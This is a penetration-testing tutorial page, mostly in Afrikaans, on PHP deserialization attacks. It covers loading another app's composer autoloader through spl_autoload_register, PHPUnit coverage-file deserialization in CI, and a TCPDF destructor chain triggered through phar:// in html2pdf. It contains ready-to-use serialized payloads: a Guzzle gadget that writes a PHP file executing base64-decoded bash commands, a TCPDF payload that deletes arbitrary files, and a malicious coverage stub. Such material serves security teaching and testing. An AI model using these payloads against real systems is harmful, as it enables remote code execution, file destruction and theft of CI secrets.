# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

Eerstens moet jy kyk wat [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) is.

## PHP deserialization + spl_autoload_register + LFI/Gadget

Ons is in 'n situasie waar ons 'n **PHP deserialization in 'n webapp** gevind het met **geen** biblioteek vatbaar vir gadgets in **`phpggc`** nie. In dieselfde container was daar egter 'n **ander composer webapp met kwesbare biblioteke**. Die doel was dus om die **composer loader van die ander webapp te laad** en dit te misbruik om 'n **gadget te laai wat daardie biblioteek sal uitbuit** met 'n gadget van die webapp wat vatbaar is vir deserialization.

Stappe:

- Jy het 'n **deserialization** gevind en daar is **geen gadget** in die huidige app-kode nie
- Jy kan 'n **`spl_autoload_register`** funksie soos die volgende misbruik om **enige plaaslike lêer met die `.php` uitbreiding te laai**
- Hiervoor gebruik jy 'n deserialization waar die naam van die klas binne **`$name`** gaan wees. Jy **kan nie** "/" of "." in 'n klasnaam in 'n serialized object gebruik nie, maar die **kode** vervang die **underscores** ("_") deur slashes ("/"). Dus sal 'n klasnaam soos `tmp_passwd` omgeskakel word na `/tmp/passwd.php` en die kode sal probeer om dit te laai.\
'n **gadget voorbeeld** sal wees: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> As jy 'n **file upload** het en 'n lêer met **`.php` extension`** kan oplaai, kan jy hierdie funksionaliteit **direk abuse** en reeds RCE kry.

In my geval het ek niks dergeliks gehad nie, maar binne dieselfde **same container** was daar nog 'n composer web page met 'n **library vulnerable to a `phpggc` gadget**.

- Om hierdie ander library te laai, moet jy eers die **load the composer loader of that other web app** laad (want die een van die huidige application sal nie toegang tot die libraries van die ander een gee nie). **Knowing the path of the application**, jy kan dit baie maklik bereik met: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- NOTE: Die **generated gadget was not working**; sodat dit sou werk het ek daardie payload **`chain.php`** van phpggc **modified** en alle attributes van die klasse van **private** na **public** gestel. Indien nie, na deserializing die string, het die attributes van die geskepte objects geen waardes gehad nie.
- Nou het ons 'n manier om die ander app se composer loader te **load** en 'n **phpggc payload that works** te hê, maar ons moet dit in dieselfde **SAME REQUEST** doen sodat die loader gelaai is wanneer die gadget gebruik word. Hiervoor het ek 'n serialized array met beide objects gestuur soos:
- Jy kan sien **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- Nou kan ons **'n lêer skep en skryf**, maar die gebruiker **kon nie in enige gids binne die webbediener skryf nie**. Soos jy in die payload kan sien, word 'n PHP-lêer wat **`system`** met 'n **base64** aanroep, geskep in **`/tmp/a.php`**. Dan kan ons **hergebruik die eerste tipe payload** wat ons as LFI gebruik het om die composer loader van die ander webapp **om die gegenereerde `/tmp/a.php` te laai**. Voeg dit net by die deserialization gadget:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Opsomming van die payload**

- **Load the composer autoload** van 'n ander webapp in dieselfde container
- **Load a phpggc gadget** om 'n library van die ander webapp te misbruik (die aanvanklike webapp wat kwesbaar is vir deserialization het nie enige gadget in sy libraries nie)
- Die gadget sal **create a file with a PHP payload** in /tmp/a.php skep met kwaadwillige opdragte (die webapp user kan nie in enige gids van enige webapp skryf nie)
- Die finale deel van ons payload sal gebruik maak om **load the generated php file** wat opdragte sal uitvoer

Ek moes hierdie **deserialization twice** aanroep. In my toetse is die eerste keer die `/tmp/a.php` lêer geskep maar nie geladen nie, en die tweede keer is dit korrek geladen.

### Onlangse phpggc goodies (2025)

- Die **phpggc master branch keeps adding chains**: OpenCart/RCE2, Drupal/FD1/SQLI1/XXE1, WordPress/YoastSEO/FW1 en ander het in 2025 verskyn — nuttig wanneer die teiken-app vendor-code met daardie projekte deel. 'n Vinnige manier om te soek is `phpggc -l | grep -E "OpenCart|Drupal|Yoast"` (update your clone first).
- Wanneer jy gadgets oor apps meng via autoloading, onthou **private properties in gadget definitions may be dropped** wanneer classes anders in die teiken herdeklaar word; wysig die gadget’s `chain.php` om properties `public` te maak as die payload met leë waardes aankom (dieselfde truuk hierbo getoon).

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` before **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** (CVE-2026-24765) unserialized arbitrary PHP objects from `.coverage` files produced by the **PHPT runner**. In CI pipelines where untrusted contributors can push tests, dropping a crafted `.coverage` file triggers deserialization as soon as the suite runs — no web access needed.

**Attack flow**

1. Plaas 'n kwaadwillige `.coverage` file in die repo (of artifact) wat 'n serialized gadget bevat wat in die test dependencies bestaan (bv. 'n Monolog of Guzzle chain van phpggc).
2. Submit a PR; wanneer CI `phpunit --configuration phpunit.xml` uitvoer, lees die PHPT runner die coverage file en deserializes die gadget, wat **RCE inside the runner container** gee.
3. Dit is veral gevaarlik wanneer toetse CI secrets mount (cloud creds, deployment keys).

**Minimal malicious coverage stub** (drop alongside a PHPT test):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Voer die PHPT uit sodat phpunit `exploit.coverage` verbruik.

## TCPDF `__destruct` POP chain vir arbitrêre lêeruitwissing

Wanneer 'n werklike `TCPDF`-instansie deur die garbage collector verwyder word, roep dit `_destroy(true)`, deurloop `$this->imagekeys`, en voer `unlink()` uit op enigiets wat soos 'n cache-lêer onder `K_PATH_CACHE` lyk. As 'n toepassing `unserialize($user_data)` uitvoer terwyl die `TCPDF`-klas gelaai is (bv. dit verwag 'n array met 'n `html` sleutel), kan jy 'n geserialiseerde objek voorsien wat instel:

- `file_id` op enige heelgetal wat nie in `self::$cleaned_ids` teenwoordig is nie (bv. `-1`).
- `imagekeys` op paadjies wat met `K_PATH_CACHE` begin of wat so gemaak kan word om daarna te lyk (bv. `/tmp/../tmp/do_not_delete_this_file.txt` wanneer `K_PATH_CACHE` `/tmp/` is).

Voorbeeldpayload wat 'n onveilige `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` stroom tref:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
Die lêer word verwyder sodra die voorwerp uit scope val. TCPDF 6.9.3 het die kontrole aangeskerp om slegs paaie met die `__tcpdf_<file_id>_`-voorvoegsel binne `K_PATH_CACHE` te verwyder en het `_unlink()` ingevoer om nie-`file://`-skemas te blokkeer, so ouer `Producer` weergawes is ideale teikens.

### Aktivering van die gadget via `phar://` in html2pdf `<cert>` tags

spipu/html2pdf (≤5.3.0) sluit TCPDF in en openbaar 'n pasgemaakte `<cert>`-blok waarvan die `src`/`privkey`-attribuut met eenvoudige `file_exists()` geverifieer word. Op PHP < 8.0 veroorsaak enige filesystem-funksie wat 'n `phar://` URL aanspreek dat die Phar-metadata deur `unserialize()` ingelees word. Deur die kwaadwillige TCPDF-voorwerp hierbo binne 'n Phar-argief te stoor, kry jy 'n betroubare POP selfs al roep die toepassing nooit `unserialize()` self aan nie.

1. Skep 'n Phar met `phar.readonly=0`, stel die stub/manifest sodat dit soos 'n beeld lyk (bv. hernoem `archive.phar` na `archive.png`), en stoor die geserialiseerde TCPDF-voorwerp in die Phar-metadata.
2. Laai/plaas die lêer êrens waar dit bereikbaar is, soos `/tmp/user_files/user_1/archive.png`.
3. Stuur HTML in wat die `<cert>`-tag bevat sodat html2pdf die deur die aanvaller beheerde pad oplos:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
Die oproep na `file_exists()` deserialiseer die metadata, instansieer TCPDF, en sy destructor verwyder die gekose lêer, wat html2pdf omskep in 'n kragtige `phar://` entry point. Weergawe 5.3.1 het `Security::checkValidPath()` bygevoeg om ongeoorloofde skemas te blokkeer, sodat legacy deployments steeds aantreklik bly.

## Verwysings

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
